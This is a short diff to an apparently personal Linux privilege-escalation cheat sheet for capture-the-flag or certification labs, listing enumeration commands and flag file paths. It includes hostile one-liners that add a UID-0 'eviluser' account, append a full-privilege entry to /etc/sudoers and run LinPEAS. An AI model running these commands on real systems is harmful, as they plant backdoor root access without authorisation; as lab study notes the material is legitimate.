@@ -78,7 +78,35 @@ openssl passwd -1
 eviluser:x:0:0::/root:/bin/bash
 su eviluser
 
+(Cron Jobs)
+cat /etc/crontab
+ls -la /etc/cron.*
+
+(Writable /etc/sudoers)
+echo "harshal ALL=(ALL:ALL) ALL" >> /etc/sudoers
+sudo su
+
+(Writable Service Files)
+find /etc/systemd/system/ -writable -type f 2>/dev/null
+
+(LinPEAS/Manual Enumeration)
+./linpeas.sh
+./LinEnum.sh
+
+(Exploit Weak NFS Permissions)
+showmount -e <target_ip>
+
+(Escalate via PATH Hijacking)
+echo $PATH
+
+
 **flag**
+/home/<username>/local.txt
+/home/<compromised_user>/local.txt
+
+/root/proof.txt
+
+-----
 cat /root/root.txt
 cat /home/<user>/user.txt
 
